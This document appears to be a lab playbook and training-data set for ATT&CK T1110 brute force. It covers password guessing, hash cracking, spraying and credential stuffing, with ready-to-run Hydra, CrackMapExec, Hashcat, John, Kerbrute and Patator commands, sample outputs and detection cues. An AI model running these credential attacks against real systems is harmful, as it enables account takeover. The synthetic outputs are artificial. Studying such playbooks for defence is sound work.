# Brute Force Playbook (ATT&CK T1110, Dataset-Ready)

> Purpose: provide realistic, high-value brute force training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Brute Force covers iterative credential attacks when passwords are unknown or when hashes/credential pairs are obtained.

- ATT&CK Technique ID: T1110
- Name: Brute Force
- Sub-techniques in scope: T1110.001, T1110.002, T1110.003, T1110.004

---

## 0. Safety and Lab Controls

1. Run only in isolated lab ranges and test tenants.
2. Use test accounts, never real employee identities.
3. Respect lockout thresholds to avoid accidental denial of service.
4. Throttle request rate and document timing gaps between attempts.
5. Record command, output, and exact target service for each run.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_bruteforce() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/bruteforce.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1110.003",
  "technique_name": "Password Spraying",
  "scenario": "Operator sprays one seasonal password against many AD users in lab",
  "command": "kerbrute passwordspray -d corp.local users.txt 'Winter2026!' --dc 10.20.30.10",
  "tool_result": {"status":"success", "highlights":["VALID LOGIN: a.bensaid@corp.local"]},
  "analyst_interpretation": "Low-and-slow multi-account authentication attempts indicate spray behavior",
  "confidence": 0.96,
  "mitigation_hint": "MFA + smart lockout + impossible travel and spray analytics"
}
```

---

## 1. Baseline Before Testing

Scenario:
- Capture account policy and authentication telemetry baseline before brute force simulation.

```bash
run_bruteforce "T1110" "policy_baseline_windows" net accounts
run_bruteforce "T1110" "policy_baseline_linux" sh -lc 'grep -E "PASS_MAX_DAYS|PASS_MIN_LEN" /etc/login.defs'
```

Example result:

```text
Lockout threshold: 5 invalid logon attempts
PASS_MIN_LEN 12
```

Analyst note:
- Baseline lockout and password policy values are required to interpret false positives and expected failures.

---

## 2. T1110.001 Password Guessing

Scenario:
- Adversary targets one known account and iterates passwords from a dictionary.

### Command Path A: SSH Single-User Guessing (Hydra)

```bash
run_bruteforce "T1110.001" "ssh_guess_hydra" hydra -l j.dupont -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.20.30.40 -t 4 -W 3 -I
```

Example result:

```text
[22][ssh] host: 10.20.30.40   login: j.dupont   password: Winter2026!
1 of 1 target successfully completed, 1 valid password found
```

### Command Path B: SMB Single-User Guessing (CrackMapExec)

```bash
run_bruteforce "T1110.001" "smb_guess_cme" crackmapexec smb 10.20.30.25 -u j.dupont -p /tmp/passwords_top100.txt --continue-on-success
```

Example result:

```text
SMB 10.20.30.25 445 FILESRV [+] CORP\j.dupont:Winter2026!
```

Detection and hardening cues:
- Alert on repeated failures for one account across one or many endpoints.
- Enforce MFA and lockout/backoff controls.

---

## 3. T1110.002 Password Cracking

Scenario:
- Adversary performs offline cracking after obtaining password hashes.

### Command Path A: NTLM Hash Cracking (Hashcat)

```bash
run_bruteforce "T1110.002" "ntlm_hashcat" hashcat -m 1000 -a 0 /tmp/lab_ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule --status --status-timer=30
```

Example result:

```text
2f4a1b...d8c5:Spring2026!
Status...........: Cracked
Recovered........: 1/5 (20.00%)
```

### Command Path B: Linux Hash Cracking (John)

```bash
run_bruteforce "T1110.002" "linux_john" john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/lab_linux_hashes.txt
```

Example result:

```text
backupsvc      (backupsvc)
1g 0:00:00:04 DONE
```

Detection and hardening cues:
- Detect suspicious hash access/dumping upstream (LSASS, SAM, shadow).
- Use long passphrases, deny weak hashes, and rotate exposed credentials quickly.

---

## 4. T1110.003 Password Spraying

Scenario:
- Adversary uses one likely-valid password against many accounts to avoid lockouts.

### Command Path A: Kerberos Password Spray (Kerbrute)

```bash
run_bruteforce "T1110.003" "kerberos_spray" kerbrute passwordspray -d corp.local /tmp/users.txt 'Winter2026!' --dc 10.20.30.10
```

Example result:

```text
[+] VALID LOGIN: a.bensaid@corp.local:Winter2026!
[+] VALID LOGIN: it.support@corp.local:Winter2026!
Done! Tested 120 logins (2 successes)
```

### Command Path B: SMB Spray Across Host Set

```bash
run_bruteforce "T1110.003" "smb_spray" crackmapexec smb /tmp/hosts.txt -u /tmp/users.txt -p 'Winter2026!' --continue-on-success
```

Example result:

```text
SMB 10.20.30.21 445 WS-021 [-] CORP\nadia:Winter2026! STATUS_LOGON_FAILURE
SMB 10.20.30.34 445 WS-034 [+] CORP\it.support:Winter2026!
```

Detection and hardening cues:
- Look for single password used against many users over narrow time windows.
- Use conditional access, MFA, and adaptive lockout.

---

## 5. T1110.004 Credential Stuffing

Scenario:
- Adversary reuses username:password pairs from external breach dumps against enterprise login services.

### Command Path A: SSH Credential Pair Testing (Hydra Combo Mode)

```bash
run_bruteforce "T1110.004" "ssh_combo_hydra" hydra -C /tmp/breach_combo_sample.txt ssh://10.20.30.40 -t 4 -W 3 -I
```

Example result:

```text
[22][ssh] host: 10.20.30.40   login: backupsvc   password: Backup!2026
1 valid password found
```

### Command Path B: Web Login Stuffing Simulation (Patator)

```bash
run_bruteforce "T1110.004" "web_combo_patator" patator http_fuzz url=https://portal.lab.local/login method=POST body='username=FILE0&password=FILE1' 0=/tmp/usernames.txt 1=/tmp/passwords.txt -x ignore:fgrep='Invalid credentials'
```

Example result:

```text
22   302   812 B   241 ms   username=it.support password=Winter2026!
Hits/Done/Skip/Fail/Size: 1/500/0/0/500
```

Detection and hardening cues:
- Correlate unusual successful logins after many low-volume failures from same ASN/device fingerprint.
- Force password resets when overlap with known breaches is detected.

---

## 6. Label-Ready Examples (JSONL)

```json
{"technique":"T1110.001","command":"hydra -l j.dupont -P top100.txt ssh://10.20.30.40","result":"Valid credential found for one account","interpretation":"Single-account iterative guessing behavior observed"}
{"technique":"T1110.002","command":"hashcat -m 1000 -a 0 lab_ntlm_hashes.txt rockyou.txt","result":"Recovered plaintext password from NTLM hash","interpretation":"Offline cracking succeeded after hash acquisition"}
{"technique":"T1110.003","command":"kerbrute passwordspray -d corp.local users.txt Winter2026!","result":"Two valid accounts found among many attempts","interpretation":"Password spray pattern (one password, many users)"}
{"technique":"T1110.004","command":"hydra -C breach_combo_sample.txt ssh://10.20.30.40","result":"Credential pair reused successfully","interpretation":"Credential overlap enabled account access"}
```

---

## 7. Coverage Checklist

- T1110 Brute Force
- T1110.001 Password Guessing
- T1110.002 Password Cracking
- T1110.003 Password Spraying
- T1110.004 Credential Stuffing

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
